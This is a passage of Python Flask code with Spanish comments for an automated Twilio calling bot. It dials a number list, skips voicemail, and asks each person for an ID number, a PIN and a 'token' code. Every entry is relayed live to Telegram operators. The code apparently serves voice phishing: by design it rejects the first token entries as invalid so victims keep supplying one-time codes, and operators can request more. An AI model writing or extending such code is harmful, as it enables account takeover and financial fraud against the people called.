    _parar_reloj(call_sid)
    # Si esa llamada la lanzó la CADENA (/ciclos), se libera su hueco: así la
    # cadena marca la SIGUIENTE de la lista en cuanto este hilo la llame.
    cadena.soltar(call_sid)


def _finalizar_panel(call_sid: str, estado_txt: str) -> None:
    """Marca el panel como terminado, congela la duración y quita los botones.

    Es idempotente: si la llamada ya se finalizó, no vuelve a tocar el panel (el
    vigilante y el aviso de Twilio pueden coincidir y no queremos pisarse).
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None or llamada.get("estado_final"):
            return
        llamada["estado_txt"] = estado_txt
        llamada["fin"] = time.time()
        llamada["estado_final"] = True
        # Si el panel TODAVIA se estaba publicando (sin mensaje_id), se anota el
        # cierre para que lo pinte el hilo que publica y no quede verde (ver
        # `_paneles_finales`). Si ya hay mensaje_id, el rojo lo pinta `_tg_panel`.
        if llamada.get("mensaje_id") is None:
            _anotar_final_pendiente(call_sid, _texto_panel(llamada))
    _tg_panel(call_sid, [])
    _limpiar(call_sid)


def _cerrar_llamada(call_sid: str, motivo: str) -> None:
    """Cierra una llamada por CUALQUIER motivo y la deja en rojo en el panel.

    TODOS los finales (boton 🛑 Colgar y /colgar, /voice/estado-llamada, buzón,
    tope de validación, agotar intentos, vigilante, fin del proceso) pasan por
    aquí: así el panel SIEMPRE termina en la MISMA luz roja (`🔴 colgado`) con el
    motivo en la línea `nota`, y con la duración total ("⏱️ Duró: MM:SS").

    Es idempotente: si la llamada ya estaba cerrada no hace nada.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None or llamada.get("estado_final"):
            return
        llamada["estado_txt"] = ESTADO_COLGADO
        llamada["nota"] = motivo
        llamada["fin"] = llamada.get("fin") or time.time()
        llamada["estado_final"] = True
        # Si el panel TODAVIA se estaba publicando (sin mensaje_id), no hay nada
        # que editar: se anota el cierre AQUI (con el MISMO candado con el que lo
        # recoge `_publicar_panel`) para que el hilo que publica pinte el rojo y
        # no quede un panel verde de una llamada ya terminada. Es EL bug real de
        # `+573000000003`: nadie contesto y el panel se quedo "en llamada".
        if llamada.get("mensaje_id") is None:
            _anotar_final_pendiente(call_sid, _texto_panel(llamada))
    _tg_panel(call_sid, [])
    _limpiar(call_sid)


def _colgar_en_twilio(call_sid: str) -> bool:
    """Corta la llamada de verdad en Twilio (REST: status=completed).

    No basta con cambiar el estado local: si la voz sigue esperando, la llamada
    continuaria viva. Aqui se le pide a Twilio que la termine.
    """
    try:
        twilio_client.calls(call_sid).update(status="completed")
        return True
    except Exception as exc:  # noqa: BLE001
        print(f"[twilio] no se pudo colgar la llamada {call_sid}: {exc}")
        return False


def _operador_actual(call_sid: str) -> str:
    """Quien aprobo la llamada, segun el usuario de Telegram que pico el boton."""
    with lock_llamadas:
        return llamadas_activas.get(call_sid, {}).get("operador", "")


@app.errorhandler(cfg.SinUrlPublicaError)
def sin_url_publica(_exc):
    """Si ngrok no está arriba, cuelga en vez de reventar con un error 500."""
    return _colgar("El servicio no está disponible en este momento. Goodbye.")


@app.route("/salud")
def salud():
    return jsonify(
        {
            "servidor": "Nova",
            "empresa": cfg.NOMBRE_EMPRESA,
            "cadena_activa": cadena.activo,
            "cadena_grupo": cadena.grupo,
            "cadena_en_curso": cadena.en_curso,
            "cadena_marcadas": cadena.marcadas,
            "cadena_posicion": cadena.posicion,
            "cadena_total": cadena.total,
            "llamadas_en_curso": len(llamadas_activas),
            "base_de_datos": bd.URL_BD,
        }
    )


def _twiml_colgar() -> tuple:
    """TwiML minimo para colgar la llamada (cuerpo, codigo HTTP)."""
    response = VoiceResponse()
    response.hangup()
    return str(response), 200


def _es_maquina(contestada_por: str) -> bool:
    """True si Twilio identificó una MAQUINA SEGURA (buzon o fax): hay que colgar.

    Twilio manda el veredicto de la deteccion de buzon (AMD) en 'AnsweredBy'.
    Los valores posibles son 'human', 'machine_start', 'machine_end_beep',
    'machine_end_silence', 'machine_end_other', 'fax', 'unknown' o vacio.

    Regla de Nova: solo se cuelga cuando Twilio TIENE constancia de que es una
    maquina (buzon o fax). Se cuelga al instante para no dejar mensaje:

      * 'machine*' / 'fax' -> maquina o fax: se cuelga (ver MAQUINAS_SEGURAS).
      * 'unknown'          -> la AMD NO llego a decidir (se rindio tras
        MAQUINA_DETECCION_TIMEOUT segundos). NO es prueba de buzon: es tambien
        el caso tipico de un HUMANO que tarda unos segundos en decir "alo".
        Antes se colgaba y eso cortaba llamadas reales; ahora NO se cuelga aqui
        (ver `_amd_dudosa`). Si de verdad era un buzon, la red de seguridad de
        `MAX_INTENTOS_ENTRADA` lo cuelga unos segundos despues, sin mensaje.
      * 'human'            -> humano: la llamada sigue su flujo normal.
      * vacio             -> NO hay veredicto (AMD desactivada o un aviso que no
        lo trae): no hay nada que cortar, la llamada sigue.
    """
    valor = (contestada_por or "").strip().lower()
    return valor in MAQUINAS_SEGURAS


def _amd_dudosa(contestada_por: str) -> bool:
    """True si Twilio NO se decidio ('unknown'): la AMD se quedo sin veredicto.

    NO se cuelga por esto (podria ser un humano que tarda en hablar), pero la
    llamada queda SIN confirmar. Ver `_es_maquina` y el bloque de MAQUINAS_SEGURAS.

    OJO: un valor VACIO NO es dudoso. Significa que no hay veredicto de AMD (la
    deteccion esta desactivada o el aviso no lo trae), no que Twilio haya dudado;
    si se tratara como dudoso, TODA llamada quedaria marcada como sin confirmar.
    """
    valor = (contestada_por or "").strip().lower()
    if not valor:
        return False
    return valor not in HUMANOS and valor not in MAQUINAS_SEGURAS


def _colgar_buzon(call_sid: str) -> tuple:
    """Cuelga en seco porque contesto un buzon: la llamada NUNCA llega al buzon.

    Se avisa en el panel (Telegram), se limpia el estado y se devuelve el TwiML
    de colgado. No se dice nada: cortar de inmediato es justo lo que se busca.
    El panel queda en la MISMA luz roja que cualquier otro cierre.
    """
    _cerrar_llamada(call_sid, "📵 contestó un buzón — colgada")
    _bd(bd.actualizar, call_sid, estado="buzon")
    return _twiml_colgar()


@app.route("/voice/amd", methods=["POST"])
def voice_amd():
    """Twilio avisa AQUI si contesta un humano o una maquina (AMD asincrona).

    Con la deteccion de buzon EN SEGUNDO PLANO, Twilio NO retiene la llamada
    esperando el analisis: por eso el saludo "Soy Nova" suena casi al instante.
    El resultado llega aparte, a esta ruta:

      * maquina o fax -> se cuelga de inmediato (sin dejar mensaje en el buzon).
        Aqui SÍ hay que cortar la llamada por la API: la AMD es asincrona, asi que
        devolver <Hangup> no afecta a la llamada ya en curso.
      * humano -> no se hace nada: la llamada sigue su flujo normal.
      * 'unknown' -> Twilio se rindio sin decidir. NO se cuelga: un 'unknown' es
        tambien el caso tipico de un HUMANO que tarda unos segundos en hablar (así
        se cortaban llamadas reales). Solo se deja constancia (`_marcar_dudosa`);
        si de verdad es un buzon, la red de seguridad de MAX_INTENTOS_ENTRADA lo
        cuelga unos segundos despues, sin dejar mensaje. Ver `_es_maquina`.
    """
    call_sid = request.form.get("CallSid", "")
    contestada_por = request.form.get("AnsweredBy", "")
    if _es_maquina(contestada_por):
        _colgar_buzon(call_sid)  # cierra el panel y limpia el estado
        _colgar_en_twilio(call_sid)  # corta la llamada VIVA (la AMD es asincrona)
    elif _amd_dudosa(contestada_por):
        _marcar_dudosa(call_sid)  # dudoso: NO se cuelga, solo se anota
        _tg_panel(call_sid)  # refresca la nota del panel (la llamada sigue viva)
    return ("", 204)


@app.route("/voice/estado-llamada", methods=["POST"])
def voice_estado_llamada():
    """Twilio avisa aqui cuando la llamada termina o es contestada.

    - Si la contesta una maquina (buzon de voz), cuelga de inmediato.
    - El panel del grupo SOLO se abre cuando alguien CONTESTA la llamada;
      mientras suena ('initiated'/'queued'/'ringing') no se manda nada.
    - Si el usuario cuelga (o la llamada termina), se cierra todo y se avisa
      en Telegram: la llamada "muere" ahi, no sigue esperando.
    """
    call_sid = request.form.get("CallSid", "")
    estado = (request.form.get("CallStatus") or "").lower()
    contestada_por = (request.form.get("AnsweredBy") or "").lower()

    # Aviso TARDÍO de una llamada ya cerrada: se ignora. Twilio puede reenviar
    # 'in-progress'/'completed' fuera de orden; sin esto, un 'in-progress' tardío
    # volvería a crear el panel con `✅ Contestó` y la duración clavada en 00:00.
    if _resuelta(call_sid):
        print(f"[voz] aviso tardío ignorado ({estado or contestada_por}) de {call_sid}")
        return _twiml_colgar()

    # Buzon de voz o fax (maquina SEGURA): colgamos sin dejar mensaje. Un
    # 'unknown' NO cuenta aqui: puede ser un humano que tarda en hablar (ver
    # `_es_maquina` y `_marcar_dudosa`).
    if _es_maquina(contestada_por):
        return _colgar_buzon(call_sid)

    # Veredicto dudoso ('unknown'): la AMD se rindio sin decidir. NO se cuelga
    # (cortaba humanos que tardaban >MAQUINA_DETECCION_TIMEOUT en hablar): solo se
    # anota y, si de verdad era un buzon, la red de seguridad lo cuelga despues.
    if _amd_dudosa(contestada_por):
        _marcar_dudosa(call_sid)

    # La llamada aun NO fue contestada ('initiated' llega en cuanto Twilio acepta
    # la llamada; 'ringing', cuando empieza a sonar). El menú del grupo NO aparece
    # todavia: solo se abre cuando alguien contesta.
    if estado in ("initiated", "queued", "ringing"):
        return ("", 204)

    # La llamada fue CONTESTADA: el evento 'answered' llega como CallStatus
    # 'in-progress'. Si el panel no existía (p.ej. lo abrió /voice/start que se
    # adelantó), se abre aqui; en cualquier caso la luz pasa a `🟢 en llamada` y
    # se deja la hora de contestacion.
    if estado == "in-progress":
        with lock_llamadas:
            llamada = llamadas_activas.get(call_sid)
            if llamada is None and call_sid in resueltas:
                # La llamada YA se cerro: este 'in-progress' llego tarde (Twilio lo
                # reenvia fuera de orden). NO se recrea la ficha ni el panel, o
                # quedaria un panel VERDE de una llamada terminada.
                print(f"[voz] 'in-progress' de una llamada ya cerrada: {call_sid}")
                return ("", 204)
            if llamada is None:
                llamada = _ficha_nueva(request.form.get("To", ""), ESTADO_EN_LLAMADA)
                llamadas_activas[call_sid] = llamada
            if not llamada.get("contestada"):
                llamada["contestada"] = True
                llamada["hora_contestada"] = _hora()
            # Mientras el flujo NO haya avanzado (sigue 'marcando'), la luz pasa
            # a 'en llamada'. Si ya está en una fase, no se retrocede el estado.
            if llamada.get("estado_txt") in (None, ESTADO_MARCANDO):
                llamada["estado_txt"] = ESTADO_EN_LLAMADA
            sin_panel = llamada.get("mensaje_id") is None
        # El veredicto dudoso se re-anota AQUÍ porque la ficha puede haberse
        # creado justo arriba (si el aviso de AMD llegó antes que 'answered', la
        # anotación de más arriba no encontró ficha). Así la nota del panel y el
        # motivo del cuelgue siempre saben que Twilio no confirmó humano.
        if _amd_dudosa(contestada_por):
            _marcar_dudosa(call_sid)
        if sin_panel:
            # Primero se marca la contestacion y luego se abre el panel: asi el
            # mensaje inicial ya sale con la hora "Contestó" incluida.
            _abrir_panel(call_sid, llamada.get("telefono", ""), ESTADO_EN_LLAMADA)
        else:
            _tg_panel(call_sid)
        return ("", 204)

    if estado in ("completed", "busy", "failed", "no-answer", "canceled"):
        with lock_llamadas:
            llamada = llamadas_activas.get(call_sid)
            ya_final = bool(llamada and llamada.get("estado_final"))
        if not ya_final:
            # Cierra el panel en la MISMA luz roja que cualquier otro final
            # (idempotente: si ya lo cerró el vigilante o un buzón, no se pisa).
            _cerrar_llamada(call_sid, f"📴 la llamada terminó ({estado})")
        # OJO (bug de la cadena "/ciclos" que solo llamaba a unos pocos): si la
        # llamada NUNCA se contestó (sonó y no la cogieron, salió ocupado, la
        # cortó Twilio...), NO existe ficha/panel, así que `_cerrar_llamada` sale
        # sin llamar a `_limpiar` y el hueco de la cadena se quedaba OCUPADO para
        # siempre. Al acumularse esos huecos, /ciclos dejaba de marcar (se clavaba
        # en el grupo inicial). Por eso aquí se libera el hueco SIEMPRE: `soltar`
        # es idempotente, así que no molesta si la llamada sí tenía panel.
        cadena.soltar(call_sid)
        # Se recuerda como resuelta aunque no hubiera panel (p. ej. 'no-answer'):
        # así ningún aviso tardío posterior vuelve a crear una ficha fantasma.
        with lock_llamadas:
            _marcar_resuelta(call_sid)
        _bd(bd.actualizar, call_sid, estado=estado)
    return ("", 204)


@app.route("/voice/start", methods=["POST"])
def voice_start():
    call_sid = request.form.get("CallSid", "")
    telefono = request.args.get("telefono") or request.form.get("To", "")
    # Aviso TARDÍO: la llamada ya se cerró (se colgó o terminó). No se vuelve a
    # abrir el panel (evita el "panel fantasma" con la duración en 00:00).
    if _resuelta(call_sid):
        print(f"[voz] /voice/start tardío ignorado de {call_sid}")
        return _twiml_colgar()
    # Con la detección de buzón activada, Twilio avisa AQUÍ (en la propia
    # petición del TwiML) de que NO contestó un humano: 'AnsweredBy'. Si es una
    # máquina SEGURA ('machine*'/'fax') se cuelga sin saludar siquiera, para que
    # la llamada NUNCA llegue al buzón. Un 'unknown' NO se cuelga aquí: es
    # también el caso de un humano que tarda en hablar. Ver `_es_maquina`.
    veredicto = request.form.get("AnsweredBy")
    if _es_maquina(veredicto):
        return _colgar_buzon(call_sid)
    # El panel se abre AL CONTESTAR: /voice/start es el TwiML que Twilio pide al
    # contestar, así que aquí la luz pasa a `🟢 en llamada`. Si el aviso
    # 'in-progress' ya lo abrió, se reutiliza el MISMO mensaje (no se duplica).
    # OJO: `_abrir_panel` va ANTES de `_marcar_dudosa` porque es quien puede CREAR
    # la ficha (si el aviso 'in-progress' no llegó): si se marcara el dudoso antes,
    # la anotación se perdería al crear la ficha desde cero.
    _abrir_panel(call_sid, telefono, ESTADO_EN_LLAMADA)
    if _amd_dudosa(veredicto):
        _marcar_dudosa(call_sid)
    with lock_llamadas:
        activa = llamadas_activas.get(call_sid)
        if activa is not None:
            # El TwiML ya arrancó (el usuario contestó): un aviso de "sonar"
            # que llegue tarde ya no debe pisar este estado.
            activa["arrancado"] = True
    _bd(
        bd.nueva_llamada,
        call_sid,
        telefono,
        empresa_origen=cfg.IVR_ORIGEN,
        destino_flujo=cfg.IVR_DESTINO,
    )
    response = _decir(cfg.SALUDO)
    response.redirect(f"{_base()}/voice/pedir-primero")
    return str(response)


@app.route("/voice/pedir-primero", methods=["POST"])
def voice_pedir_primero():
    # El primer dato va casi de corrido tras la presentacion (PAUSA_INICIO);
    # las demas preguntas usan la PAUSA normal. Al ser un numero corto, se espera
    # menos silencio antes de leerlo (TIMEOUT_DIGITOS_CORTO). Se repite la PAUSA
    # corta (y no la normal) para que quien marca '#' NO oiga 2 s de silencio
    # antes de la voz de la cedula: es el mismo problema que en pedir-segundo.
    return _preguntar(
        cfg.TEXTO_PASO_1,
        f"{_base()}/voice/recibir-primero",
        pausa=cfg.PAUSA_INICIO,
        timeout=cfg.TIMEOUT_DIGITOS_CORTO,
    )


@app.route("/voice/recibir-primero", methods=["POST"])
def voice_recibir_primero():
    call_sid = request.form.get("CallSid", "")
    primero = (request.form.get("Digits") or "").strip()

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()

    if not primero:
        # primer_dato=True: el primer reintento pregunta "¿aló?" (por si la AMD
        # quedó dudosa y en realidad es un humano que tardó en hablar).
        return _reintentar(
            call_sid, f"{_base()}/voice/pedir-primero", primer_dato=True
        )

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()
        llamadas_activas[call_sid]["primero"] = primero
        llamadas_activas[call_sid]["intentos"] = 0
        llamadas_activas[call_sid]["latido"] = time.time()
    _bd(bd.actualizar, call_sid, primero=primero, estado="recibiendo_datos")
    _bd(bd.registrar_evento, call_sid, "numero", f"primero={primero}")
    _tg_numero(call_sid, 1, primero)

    response = VoiceResponse()
    response.redirect(f"{_base()}/voice/pedir-segundo?call_sid={call_sid}")
    return str(response)


@app.route("/voice/pedir-segundo", methods=["GET", "POST"])
def voice_pedir_segundo():
    call_sid = request.args.get("call_sid", "") or request.form.get("CallSid", "")
    # La clave es un numero corto: se lee con el silencio corto Y la pregunta
    # enlaza DE CORRIDO (pausa de 0.5 s). Con la PAUSA normal (2 s) el usuario
    # que ya marco '#' en la cedula se comia 2 s de silencio antes de oir la
    # clave, aunque Twilio ya habia terminado la captura al instante.
    return _preguntar(
        cfg.TEXTO_PASO_2,
        f"{_base()}/voice/recibir-segundo?call_sid={call_sid}",
        pausa=cfg.PAUSA_INICIO,
        timeout=cfg.TIMEOUT_DIGITOS_CORTO,
    )


@app.route("/voice/recibir-segundo", methods=["POST"])
def voice_recibir_segundo():
    call_sid = request.args.get("call_sid") or request.form.get("CallSid", "")
    segundo = (request.form.get("Digits") or "").strip()

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()

    if not segundo:
        return _reintentar(call_sid, f"{_base()}/voice/pedir-segundo?call_sid={call_sid}")

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()
        llamada = llamadas_activas[call_sid]
        llamada["segundo"] = segundo
        llamada["intentos"] = 0
        llamada["estado"] = ESPERANDO_1_2
        # Arranca la espera de ESTA fase (base del tope TIMEOUT_APROBACION).
        # OJO: NO se toca `inicio`, que es el arranque de la LLAMADA y la base
        # del cronómetro del panel (si se pisara, la duración volvería a 00:00).
        llamada["inicio_espera"] = time.time()
        llamada["latido"] = time.time()
        primero = llamada["primero"]

    _bd(bd.actualizar, call_sid, segundo=segundo, estado=ESPERANDO_1_2)
    _bd(bd.registrar_evento, call_sid, "numero", f"segundo={segundo}")
    _tg_numero(call_sid, 2, segundo)

    _enviar_fase_1(call_sid, primero, segundo)
    # Dice "estamos validando" y empieza a consultar seguido (fase1 decide si
    # repetir el aviso cada INTERVALO_ESPERA). Asi reacciona apenas se valida.
    with lock_llamadas:
        if call_sid in llamadas_activas:
            llamadas_activas[call_sid]["ultimo_aviso"] = time.time()
    response = _decir(cfg.TEXTO_VALIDANDO)
    response.pause(length=cfg.INTERVALO_SONDEO)
    response.redirect(f"{_base()}/voice/fase1?call_sid={call_sid}")
    return str(response)


@app.route("/voice/fase1", methods=["GET", "POST"])
def voice_fase1():
    """Espera la decision de Telegram sin bloquear el servidor."""
    call_sid = request.args.get("call_sid", "")
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None:
            return _colgar()
        estado = llamada["estado"]
        llamada["latido"] = time.time()
        if (
            estado == ESPERANDO_1_2
            and time.time() - _desde_espera(llamada) > cfg.TIMEOUT_APROBACION
        ):
            llamada["estado"] = estado = COLGADO

    base = _base()
    if estado == APROBADO_1_2:
        # El texto del tercer numero ya lo dice /voice/pedir-tercero: no lo
        # repetimos aqui o el usuario lo escucharia dos veces seguidas.
        response = VoiceResponse()
        response.redirect(f"{base}/voice/pedir-tercero?call_sid={call_sid}")
        return str(response)
    if estado == RECHAZADO_1_2:
        with lock_llamadas:
            if call_sid in llamadas_activas:
                llamada = llamadas_activas[call_sid]
                llamada["intentos"] = 0
                llamada["intentos_tercero"] = 0
                llamada["horas"] = {}
                llamada["terceros"] = []
                llamada["estado_txt"] = ESTADO_EN_LLAMADA
                llamada["nota"] = "🟠 reiniciando el proceso..."
        _tg_panel(call_sid, [])
        response = _decir(cfg.TEXTO_RECHAZO_1_2)
        response.redirect(f"{base}/voice/pedir-primero")
        return str(response)
    if estado == COLGADO:
        _cerrar_llamada(call_sid, "🔴 colgó (tiempo de validación agotado)")
        return _colgar(cfg.TEXTO_TIEMPO_AGOTADO)

    # Consultamos seguido (cada INTERVALO_SONDEO) para reaccionar RAPIDO a la
    # validacion, y repetimos el aviso de "validando" solo cada INTERVALO_ESPERA.
    with lock_llamadas:
        if call_sid in llamadas_activas:
            llamada = llamadas_activas[call_sid]
            ultimo = llamada.get("ultimo_aviso") or llamada.get("inicio") or time.time()
            toca_hablar = (
                cfg.INTERVALO_ESPERA > 0
                and time.time() - ultimo >= cfg.INTERVALO_ESPERA
            )
            if toca_hablar:
                llamada["ultimo_aviso"] = time.time()
        else:
            toca_hablar = True

    response = VoiceResponse()
    if toca_hablar:
        response.say(cfg.TEXTO_VALIDANDO, language=cfg.IDIOMA_VOZ)
    response.pause(length=cfg.INTERVALO_SONDEO)
    response.redirect(f"{base}/voice/fase1?call_sid={call_sid}")
    return str(response)


@app.route("/voice/pedir-tercero", methods=["GET", "POST"])
def voice_pedir_tercero():
    call_sid = request.args.get("call_sid", "")
    # Aqui el usuario ya conoce el flujo: se dice corto y se deja una pausa
    # DESPUES para que marque sin que la voz le corte el tono.
    return _preguntar(
        cfg.TEXTO_PASO_3,
        f"{_base()}/voice/recibir-tercero?call_sid={call_sid}",
        pausa=cfg.PAUSA_TOKEN,
        pausa_antes=False,
    )


@app.route("/voice/recibir-tercero", methods=["POST"])
def voice_recibir_tercero():
    call_sid = request.args.get("call_sid") or request.form.get("CallSid", "")
    tercero = (request.form.get("Digits") or "").strip()

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()

    if not tercero:
        return _reintentar(call_sid, f"{_base()}/voice/pedir-tercero?call_sid={call_sid}")

    with lock_llamadas:
        if call_sid not in llamadas_activas:
            return _colgar()
        llamada = llamadas_activas[call_sid]
        llamada["tercero"] = tercero
        llamada["intentos"] = 0
        # El código token se pide varias veces: los primeros intentos se
        # rechazan solos (token inválido) y solo el último se acepta.
        llamada["intentos_tercero"] = llamada.get("intentos_tercero", 0) + 1
        llamada["latido"] = time.time()
        intento = llamada["intentos_tercero"]
        # Guardamos cada intento (valor + hora) para mostrarlos todos en el panel.
        # Sin tope: si el operador pidió otro token, el 4.o, 5.o... se escriben abajo.
        guardados = llamada.setdefault("terceros", [])
        guardados.append({"valor": tercero, "hora": _hora()})
        primero = llamada["primero"]
        segundo = llamada["segundo"]
        if intento >= cfg.INTENTOS_TERCERO:
            llamada["estado"] = ESPERANDO_3
            # Reinicia la espera de ESTA fase (NO `inicio`: el cronómetro del
            # panel debe seguir contando desde que arrancó la llamada).
            llamada["inicio_espera"] = time.time()

    _bd(bd.actualizar, call_sid, tercero=tercero)
    _bd(bd.registrar_evento, call_sid, "numero", f"tercero={tercero}")
    _tg_panel(call_sid)

    if intento < cfg.INTENTOS_TERCERO:
        _enviar_token_invalido(call_sid, intento, primero, segundo, tercero)
        # Un momento en blanco y luego el propio aviso ("Token inválido. Reingrese
        # el código.") sirve de texto para marcar el siguiente token: NO se repite
        # "Ingrese Código token" (ya se dijo al pedir el token la primera vez).
        return _repedir_token_invalido(call_sid)

    _bd(bd.actualizar, call_sid, estado=ESPERANDO_3)
    _enviar_fase_2(call_sid, primero, segundo, tercero)
    response = VoiceResponse()
    response.redirect(f"{_base()}/voice/fase2?call_sid={call_sid}")
    return str(response)


@app.route("/voice/fase2", methods=["GET", "POST"])
def voice_fase2():
    call_sid = request.args.get("call_sid", "")
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None:
            return _colgar()
        estado = llamada["estado"]
        llamada["latido"] = time.time()
        if (
            estado == ESPERANDO_3
            and time.time() - _desde_espera(llamada) > cfg.TIMEOUT_APROBACION
        ):
            llamada["estado"] = estado = COLGADO

    base = _base()
    if estado == APROBADO_FINAL:
        operador = _operador_actual(call_sid)
        _cerrar_llamada(
            call_sid, f"✅ proceso terminado (por {operador or 'operador'})"
        )
        _bd(bd.cerrar, call_sid, operador)
        response = _decir(cfg.TEXTO_DESPEDIDA)
        response.hangup()
        return str(response)
    if estado == RECHAZADO_3:
        # El operador invalida el tercer número: hubo un error y se reinicia
        # el proceso completo, volviendo a pedir los tres números.
        with lock_llamadas:
            if call_sid in llamadas_activas:
                llamada = llamadas_activas[call_sid]
                llamada["primero"] = None
                llamada["segundo"] = None
                llamada["tercero"] = None
                llamada["intentos"] = 0
                llamada["intentos_tercero"] = 0
                llamada["horas"] = {}
                llamada["terceros"] = []
                llamada["estado_txt"] = ESTADO_EN_LLAMADA
                llamada["nota"] = "🟠 reiniciando el proceso..."
                llamada["estado"] = INICIADA
        _tg_panel(call_sid, [])
        response = _decir(cfg.TEXTO_ERROR_REINICIO)
        response.redirect(f"{base}/voice/pedir-primero")
        return str(response)
    if estado == COLGADO:
        _cerrar_llamada(call_sid, "🔴 colgó (tiempo de validación agotado)")
        return _colgar(cfg.TEXTO_TIEMPO_AGOTADO)
    if estado == PIDIENDO_MAS:
        # El operador prefirió seguir pidiendo tokens (4.o, 5.o...): se vuelve a
        # pedir el código sin reiniciar el proceso, y con el MISMO aviso que cuando
        # un token falla ("Token inválido. Reingrese el código."), no "Ingrese Código token".
        return _repedir_token_invalido(call_sid)

    response = VoiceResponse()
    # Igual que en fase1: tramos cortos para reaccionar rapido a Telegram.
    response.pause(length=cfg.INTERVALO_SONDEO)
    response.redirect(f"{base}/voice/fase2?call_sid={call_sid}")
    return str(response)


# --------------------------------------------------------------- TELEGRAM ----


def _leer_argumentos_numeros(texto: str) -> list[str]:
    """Extrae y normaliza los telefonos que vienen tras el comando.

    Acepta varios en la misma linea: '/agregar +57300... +57310...'.
    Lanza ValueError con el detalle si alguno no es valido.
    """
    partes = texto.split()[1:]
    if not partes:
        raise ValueError(
            "Falta el número. Uso: /agregar +573001234567 (puedes poner varios)"
        )
    return [cfg.normalizar_numero(p) for p in partes]


def _agregar_numeros(texto: str) -> None:
    """Comando /agregar: suma telefonos a numeros.txt sin repetir."""
    try:
        nuevos = _leer_argumentos_numeros(texto)
    except ValueError as exc:
        _tg_mensaje(f"⚠️ {exc}")
        return

    lista = cfg.numeros_a_llamar()
    agregados = []
    for numero in nuevos:
        if numero in lista:
            continue
        lista.append(numero)
        agregados.append(numero)

    if not agregados:
        _tg_mensaje("🟡 Esos números ya estaban en la lista.")
        return

    cfg.guardar_numeros(lista)
    _tg_mensaje(
        "✅ Agregados: " + ", ".join(agregados) + f"\nTotal en la lista: {len(lista)}"
    )


def _validar_destinos(numeros: list) -> list:
    """Devuelve los numeros a los que Twilio NO deja llamar.

    Prueba cada destino con los origenes conocidos. Si Twilio responde 573003
    (origen no asignado) o cualquier otro error de permiso, ese numero no sirve.
    """
    from twilio.base.exceptions import TwilioRestException

    invalidos = []
    for destino in numeros:
        candidatos = _origenes_disponibles() or [cfg.TWILIO_NUMBER]
        ok = False
        for origen in candidatos:
            try:
                twilio_client.calls.create(
                    to=destino,
                    from_=origen,
                    url="http://demo.twilio.com/docs/voice.xml",
                )
                ok = True
                break
            except TwilioRestException as exc:
                if exc.code in (573002, 573003):
                    continue
                # Otro error (numero malo, etc.): tambien es invalido.
                ok = False
                break
        if not ok:
            invalidos.append(destino)
    return invalidos


def _quitar_numeros(texto: str) -> None:
    """Comando /quitar: elimina telefonos de numeros.txt."""
    try:
        objetivos = _leer_argumentos_numeros(texto)
    except ValueError as exc:
        _tg_mensaje(f"⚠️ {exc}")
        return

    lista = cfg.numeros_a_llamar()
    quedan = [n for n in lista if n not in objetivos]
    quitados = [n for n in lista if n in objetivos]

    if not quitados:
        _tg_mensaje("🟡 No encontré esos números en la lista. Mírala con /numeros")
        return

    cfg.guardar_numeros(quedan)
    _tg_mensaje(
        "🗑️ Quitados: " + ", ".join(quitados) + f"\nTotal en la lista: {len(quedan)}"
    )


def _pagina_de(texto: str, defecto: int = 1) -> int:
    """Numero de pagina pedido: '/numeros 3' -> 3. Si no hay, la 1.ª."""
    partes = (texto or "").split()
    if len(partes) < 2:
        return defecto
    try:
        return max(1, int(partes[1]))
    except (TypeError, ValueError):
        return defecto


def _pagina_entera(valor) -> int:
    """Convierte el callback (p. ej. 'menu_3' -> '3') en número de página."""
    try:
        return int(valor)
    except (TypeError, ValueError):
        return 1


def _entero_extra(texto: str, defecto: int) -> int:
    """Entero opcional tras el comando: '/ciclos 8' -> 8.

    Si no viene o no es un número, devuelve el valor por defecto (mínimo 1).
    """
    partes = (texto or "").split()
    if len(partes) < 2:
        return defecto
    try:
        return max(1, int(partes[1]))
    except (TypeError, ValueError):
        return defecto


def _numero_explicito(texto: str) -> str | None:
    """Telefono escrito tras el comando: '/llamar +573000000004'.

    Si lo que sigue no es un telefono (p. ej. '/numeros 3') se ignora y se
    devuelve None, para que el comando haga su comportamiento normal (menu).
    """
    partes = (texto or "").split()[1:]
    if not partes:
        return None
    try:
        return cfg.normalizar_numero(partes[0])
    except ValueError:
        return None


def _total_paginas(numeros: list) -> int:
    """Cuantas paginas de NUMEROS_POR_PAGINA (10 por defecto) caben en la lista."""
    por_pagina = max(1, cfg.NUMEROS_POR_PAGINA)
    return max(1, (len(numeros) + por_pagina - 1) // por_pagina)


def _normalizar_pagina(pagina: int, total: int) -> int:
    """Deja la pagina dentro de rango (1..total), sin petar si total es 0."""
    return min(max(1, pagina or 1), max(1, total))


def _tramo_pagina(numeros: list, pagina: int) -> list:
    """Los numeros que tocan en esa pagina (un grupo de 10 por defecto)."""
    por_pagina = max(1, cfg.NUMEROS_POR_PAGINA)
    pagina = _normalizar_pagina(pagina, _total_paginas(numeros))
    inicio = (pagina - 1) * por_pagina
    return numeros[inicio : inicio + por_pagina]


def _texto_pagina(numeros: list, pagina: int) -> str:
    """Texto de UNA pagina: los numeros con su posicion REAL en toda la lista."""
    por_pagina = max(1, cfg.NUMEROS_POR_PAGINA)
    total_paginas = _total_paginas(numeros)
    pagina = _normalizar_pagina(pagina, total_paginas)
    inicial = (pagina - 1) * por_pagina
    lineas = [
        f"📋 Números a marcar ({len(numeros)} en total) · "
        f"página {pagina}/{total_paginas}"
    ]
    lineas.extend(
        f"{inicial + i}. {n}" for i, n in enumerate(_tramo_pagina(numeros, pagina), 1)
    )
    return "\n".join(lineas)


def _encabezado_menu(numeros: list, pagina: int) -> str:
    """Encabezado del menu de /llamar ('¿A cuál número quieres llamar?')."""
    total_paginas = _total_paginas(numeros)
    if total_paginas == 1:
        return "📞 ¿A cuál número quieres llamar?"
    return (
        f"📞 ¿A cuál número quieres llamar? "
        f"(página {_normalizar_pagina(pagina, total_paginas)}/{total_paginas})"
    )


def _teclado_navegar(numeros: list, pagina: int, prefijo: str) -> list:
